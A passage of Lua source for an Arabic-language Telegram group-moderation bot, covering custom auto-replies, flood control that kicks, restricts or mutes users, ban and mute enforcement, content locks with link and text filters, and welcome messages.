if msg.content_.audio_ then DevAbs:set(David..'Abs:Audio:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAbs:set(David..'Abs:Photo:GpRed'..SaveGpRed..''..msg.chat_id_..'', photo_in_group) 
end
if msg.content_.animation_ then DevAbs:set(David..'Abs:Gif:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevAbs:set(David..'Abs:Text:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.text_)
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
DevAbs:del(David..'Abs:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(David..'DelManagerRep'..msg.chat_id_..'')
return false 
end 
end
if msg.content_.text_ and not DevAbs:get(David..'Abs:Lock:GpRed'..msg.chat_id_) then 
if DevAbs:get(David..'Abs:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(David..'Abs:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevAbs:get(David..'Abs:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(David..'Abs:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevAbs:get(David..'Abs:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(David..'Abs:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevAbs:get(David..'Abs:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(David..'Abs:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevAbs:get(David..'Abs:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(David..'Abs:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevAbs:get(David..'Abs:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(David..'Abs:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevAbs:get(David..'Abs:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(David..'Abs:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..''))
end
if DevAbs:get(David..'Abs:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then
function DavidTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevAbs:get(David..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(David..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAbs:get(David..'Abs:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, DavidTEAM)
end
end
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevAbs:get(David.."Abs:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevAbs:get(David..'DelSudoRep')
DevAbs:del(David.."Abs:Sudo:AllRed",DelSudoRep)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
DevAbs:del(David.."Abs:Add:AllText"..msg.sender_user_id_)
DevAbs:del(David.."Abs:Add:AllRed"..msg.sender_user_id_)
DevAbs:del(David.."DelSudoRep")
return false
end
DevAbs:del(David.."Abs:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevAbs:get(David.."Abs:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevAbs:set(David.."Abs:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevAbs:set(David.."Abs:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevAbs:set(David.."Abs:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevAbs:set(David.."Abs:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevAbs:set(David.."Abs:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAbs:set(David.."Abs:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevAbs:set(David.."Abs:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevAbs:set(David.."Abs:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
DevAbs:del(David.."Abs:Add:AllText"..msg.sender_user_id_)
DevAbs:del(David..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevAbs:get(David..'Abs:Lock:AllRed'..msg.chat_id_) then
if DevAbs:get(David.."Abs:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(David.."Abs:Video:AllRed"..msg.content_.text_))
end
if DevAbs:get(David.."Abs:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(David.."Abs:File:AllRed"..msg.content_.text_))
end
if DevAbs:get(David.."Abs:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(David.."Abs:Voice:AllRed"..msg.content_.text_))
end
if DevAbs:get(David.."Abs:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(David.."Abs:Audio:AllRed"..msg.content_.text_))
end
if DevAbs:get(David.."Abs:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(David.."Abs:Photo:AllRed"..msg.content_.text_))
end
if  DevAbs:get(David.."Abs:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(David.."Abs:Gif:AllRed"..msg.content_.text_))
end
if DevAbs:get(David.."Abs:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(David.."Abs:Stecker:AllRed"..msg.content_.text_))
end
if DevAbs:get(David.."Abs:Text:AllRed"..msg.content_.text_) then
function DavidTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevAbs:get(David..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(David..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAbs:get(David.."Abs:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, DavidTEAM)
end
end 
--       Spam Send        --
function NotSpam(msg,Type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local GetName = '['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..')'
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⌁︙العضو ↫ '..GetName..' \n⌁︙قام بالتكرار المحدد تم طرده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false  
end 
if Type == "keed" and not DevAbs:sismember(David..'Abs:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
https.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
DevAbs:sadd(David..'Abs:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⌁︙العضو ↫ '..GetName..' \n⌁︙قام بالتكرار المحدد تم تقيده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end  
if Type == "mute" and not DevAbs:sismember(David..'Abs:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevAbs:sadd(David..'Abs:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⌁︙العضو ↫ '..GetName..' \n⌁︙قام بالتكرار المحدد تم كتمه '
SendText(msg.chat_id_,Text,0,'md')
return false  
end
end,nil)
end  
--  end functions David --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevAbs:hget(David.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= David then
floods = DevAbs:hget(David.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevAbs:hget(David.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevAbs:hget(David.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevAbs:get(David.."Abs:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevAbs:hget(David.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevAbs:hget(David.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevAbs:setex(David.."Abs:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevAbs:hget(David.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevAbs:hget(David.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevAbs:hget(David.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevAbs:hget(David.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevAbs:hget(David.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(David) then
DevAbs:set(David..'Abs:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevAbs:get(David..'Abs:PinnedMsg'..msg.chat_id_)
if pin_id and DevAbs:get(David..'Abs:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevAbs:get(David..'Abs:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevAbs:del(David..'Abs:viewget'..msg.sender_user_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عدد مشاهدات المنشور هي ↫ ('..msg.views_..')', 1, 'md')
DevAbs:del(David..'Abs:viewget'..msg.sender_user_id_)
end
end
--         Photo          --
if msg.content_.ID == "MessagePhoto" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(David..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(David..'Abs:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(David..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(David..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(David..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(David..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(David..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(David..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--        Markdown        --
elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
if DevAbs:get(David..'Abs:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--        Document        --
elseif msg.content_.ID == "MessageDocument" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(David..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(David..'Abs:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(David..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(David..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(David..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(David..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(David..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(David..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if DevAbs:get(David..'Abs:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--        Sticker         --
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevAbs:get(David..'Abs:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
elseif msg.content_.ID == "MessageChatJoinByLink" then
if DevAbs:get(David..'Abs:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
function get_welcome(extra,result,success)
if DevAbs:get(David..'Abs:Groups:Welcomes'..msg.chat_id_) then
text = DevAbs:get(David..'Abs:Groups:Welcomes'..msg.chat_id_)
else
text = '• نورت حبي \n• [firstname lastname] \n• [@username]'
end
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
local text = text:gsub('username',(result.username_ or 'X7PX7'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if DevAbs:get(David.."Abs:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevAbs:get(David..'Abs:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = David,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(David) then 
if DevAbs:sismember(David..'Abs:Groups',msg.chat_id_) then
BotText = "مفعله في السابق\n⌁︙ارسل ↫ الاوامر واستمتع بالمميزيات"
else 
BotText = "معطله يجب رفعي مشرف\n⌁︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
local AbsText = (DevAbs:get(David.."Abs:Text:BotWelcome") or "⌁︙مرحبا انا بوت اسمي "..NameBot.."\n⌁︙حالة المجموعه ↫ "..BotText.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉")
local AbsPhoto = (DevAbs:get(David.."Abs:Photo:BotWelcome") or abbas.photos_[0].sizes_[1].photo_.persistent_id_)
if DevAbs:get(David.."Abs:Photo:BotWelcome") or abbas.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,AbsPhoto,AbsText)
else 
send(msg.chat_id_,msg.id_,AbsText)
end 
end   
end
end,nil)
end
if DevAbs:get(David..'Abs:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if DevAbs:get(David.."Abs:Lock:Welcome"..msg.chat_id_) then
if DevAbs:get(David..'Abs:Groups:Welcomes'..msg.chat_id_) then
text = DevAbs:get(David..'Abs:Groups:Welcomes'..msg.chat_id_)
else
text = '• نورت حبي \n• [firstname lastname] \n• [@username]'
end
local text = text:gsub('firstname',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('lastname',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('username',(msg.content_.members_[0].username_ or 'X7PX7'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--        Contact         --
elseif msg.content_.ID == "MessageContact" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(David..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(David..'Abs:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--         Audio          --
elseif msg.content_.ID == "MessageAudio" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(David..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(David..'Abs:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(David..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(David..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(David..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(David..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(David..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(David..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--         Voice          --
elseif msg.content_.ID == "MessageVoice" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(David..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(David..'Abs:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(David..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(David..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(David..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(David..'Abs:Lock:WebLinks'..msg.chat_id_) then
